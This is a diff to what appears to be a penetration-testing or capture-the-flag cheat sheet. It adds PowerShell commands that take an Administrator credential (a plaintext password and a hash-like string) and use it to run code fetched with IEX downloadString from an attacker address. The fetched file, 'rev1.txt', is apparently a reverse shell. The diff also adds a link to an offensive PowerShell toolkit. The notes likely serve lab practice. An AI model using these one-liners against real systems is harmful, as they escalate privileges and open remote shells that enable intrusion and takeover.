@@ -88,7 +88,13 @@ cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Obje
 #create credentials object
 $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
+start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
 Invoke-Command -Credential $cred -ScriptBlock {"whoami"}
+
+#powershell suite runas 
+  paste following at the bottom of the script(see bart video @ 55:36):
+  Invoke-runAs -User administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(new-Object Net.webclient).downloadString('http://10.10.14.73/rev1.txt')"
+
 
 LINUX
 
@@ -113,7 +119,7 @@ sherlock --> https://github.com/rasta-mouse/Sherlock
 empire --> https://github.com/EmpireProject/Empire.git
 unicorn --> https://github.com/trustedsec/unicorn.git
 powersploit --> https://github.com/PowerShellMafia/PowerSploit.git
-
+powershell-suite --> https://github.com/FuzzySecurity/PowerShell-Suite
 APT
 gobuster
 mdbtools
